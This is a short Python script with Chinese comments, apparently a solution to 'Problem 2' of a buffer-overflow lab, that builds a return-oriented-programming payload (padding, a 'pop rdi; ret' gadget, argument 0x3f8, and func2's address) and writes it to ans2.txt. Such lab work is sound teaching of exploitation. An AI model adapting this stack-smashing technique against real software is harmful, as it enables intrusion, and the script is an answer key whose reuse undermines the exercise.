import struct

# 问题2：NX开启，使用ROP：pop rdi; ret；参数0x3f8；调用func2
# memcpy拷贝0x38字节到8字节缓冲区；返回地址偏移16
# ROP链与目标：
POP_RDI = 0x4012c7  # 指向指令序列 "pop rdi; ret"
FUNC2 = 0x401216
ARG = 0x3f8

padding = b'A' * 16
rop = struct.pack('<Q', POP_RDI) + struct.pack('<Q', ARG) + struct.pack('<Q', FUNC2)
# 补齐到拷贝总长度0x38字节
total = 0x38
extra = total - len(padding) - len(rop)
payload = padding + rop + (b'B' * extra)
with open('ans2.txt', 'wb') as f:
    f.write(payload)
print('Payload written to ans2.txt (Problem 2)')